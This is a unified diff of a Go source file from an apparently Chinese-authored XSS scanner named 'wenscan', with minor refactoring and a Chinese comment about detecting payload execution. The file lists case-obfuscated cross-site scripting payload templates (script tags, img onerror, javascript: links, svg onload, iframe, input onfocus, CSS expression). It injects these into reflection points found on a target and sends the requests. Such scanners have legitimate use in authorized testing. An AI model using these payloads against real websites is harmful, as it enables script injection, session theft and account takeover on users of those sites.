@@ -5,23 +5,23 @@ import (
 	"wenscan/Helper"
 	log "wenscan/Log"
 	"wenscan/Xss"
-	Httpex "wenscan/http"
+	http "wenscan/http"
 
 	"github.com/thoas/go-funk"
 )
 
 var (
-	// img_payload,
-	script_payload     string = "<ScRiPt>%s</sCrIpT>"
-	JaVaScRiPt_payload string = "<ScRiPt>JaVaScRiPt:var %s</sCrIpT>"
-	img_payload        string = "<iMg SrC=1 oNeRrOr=%s>"
-	href_payload       string = "<a HrEf=JaVaScRiPt:%s>cLiCk</A>"
-	svg_payload        string = "<sVg/OnLoAd=%s>"
-	iframe_payload     string = "<IfRaMe SrC=jAvAsCrIpT:%s>"
-	input_payload      string = "<input autofocus onfocus=%s>"
-	style_payload      string = "expression(a(%s))"
-	payload3_prompt    string = "prompt(1)"
+	script_payload string = "<ScRiPt>%s</sCrIpT>"
+	//JaVaScRiPt_payload string = "<ScRiPt>JaVaScRiPt:var %s</sCrIpT>"
+	img_payload     string = "<iMg SrC=1 oNeRrOr=%s>"
+	href_payload    string = "<a HrEf=JaVaScRiPt:%s>cLiCk</A>"
+	svg_payload     string = "<sVg/OnLoAd=%s>"
+	iframe_payload  string = "<IfRaMe SrC=jAvAsCrIpT:%s>"
+	input_payload   string = "<input autofocus onfocus=%s>"
+	style_payload   string = "expression(a(%s))"
+	payload3_prompt string = "prompt(1)"
 )
+
 var payloads = []string{
 	script_payload,
 }
@@ -29,7 +29,7 @@ var payloads = []string{
 func main() {
 	log.DebugEnable(false)
 	playload := Xss.RandStringRunes(12)
-	Spider := Httpex.Spider{}
+	Spider := http.Spider{}
 	Spider.Init()
 	defer Spider.Close()
 	html := Spider.Sendreq("", playload)
@@ -40,6 +40,7 @@ func main() {
 	}
 	var result interface{}
 	VulOK := false
+
 	for _, tag := range payloads {
 		result = funk.Map(locations, func(item Helper.Occurence) (bool, string) {
 			var newpayload string
@@ -91,6 +92,7 @@ func main() {
 					log.Info("generator payload:%s", paylod)
 					html := Spider.Sendreq("", paylod)
 					log.Info("html:%s", *html)
+					//判断执行的payload是否存在闭合标签，目前是用console.log(flag)要捕获控制台输出，你可以改别的好判断
 
 				}
 			}
